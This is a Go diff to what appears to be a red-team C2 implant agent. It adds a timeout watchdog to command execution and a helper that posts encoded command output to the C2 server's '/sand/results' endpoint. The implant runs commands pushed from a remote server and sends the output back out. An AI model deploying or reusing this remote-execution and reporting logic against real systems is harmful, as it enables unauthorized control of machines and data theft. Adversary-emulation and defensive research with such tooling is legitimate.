@@ -9,11 +9,17 @@ import (
 	"net/http"
 	"os"
 	"path/filepath"
+	"reflect"
 	"runtime"
 	"strings"
 
 	"../execute"
 	"../util"
+)
+
+const (
+	// TIMEOUT in seconds represents how long a single command should run before timing out
+	TIMEOUT = 50
 )
 
 // Instructions is a single call to the C2
@@ -57,20 +63,29 @@ func Drop(server string, payload string) {
 
 // Execute executes a command and posts results
 func Execute(profile map[string]interface{}, command map[string]interface{}) {
+	timeoutChan := make(chan bool, 1)
+	resultChan := make(chan map[string]interface{}, 1)
 	cmd := string(util.Decode(command["command"].(string)))
 	status := "0"
-	result, err := execute.Execute(cmd, command["executor"].(string))
-	if err != nil {
-		status = "1"
+	var result []byte
+	go util.TimeoutWatchdog(timeoutChan, TIMEOUT)
+	go execute.Execute(cmd, command["executor"].(string), resultChan)
+ExecutionLoop:
+	for {
+		select {
+		case data := <-resultChan:
+			result = reflect.ValueOf(data["result"]).Bytes()
+			if reflect.ValueOf(data["err"]).IsValid() {
+				status = "1"
+			}
+			break ExecutionLoop
+		case <-timeoutChan:
+			result = []byte("Command execution timed out.")
+			status = "124"
+			break ExecutionLoop
+		}
 	}
-	address := fmt.Sprintf("%s/sand/results", profile["server"])
-	link := fmt.Sprintf("%f", command["id"].(float64))
-	data, _ := json.Marshal(map[string]string{"link_id": link, "output": string(util.Encode(result)), "status": status})
-	request(address, data)
-	if cmd == "die" {
-		fmt.Println("[+] Shutting down...")
-		util.StopProcess(os.Getpid())
-	}
+	sendExecutionResults(command["id"], profile["server"], result, status, cmd)
 }
 
 // ExecuteInstruction takes the command and profile and executes that command step
@@ -83,6 +98,17 @@ func ExecuteInstruction(command map[string]interface{}, profile map[string]inter
 		}
 	}
 	Execute(profile, command)
+}
+
+func sendExecutionResults(command_id interface{}, server interface{}, result []byte, status string, cmd string) {
+	address := fmt.Sprintf("%s/sand/results", server)
+	link := fmt.Sprintf("%f", command_id.(float64))
+	data, _ := json.Marshal(map[string]string{"link_id": link, "output": string(util.Encode(result)), "status": status})
+	request(address, data)
+	if cmd == "die" {
+		fmt.Println("[+] Shutting down...")
+		util.StopProcess(os.Getpid())
+	}
 }
 
 func request(address string, data []byte) []byte {
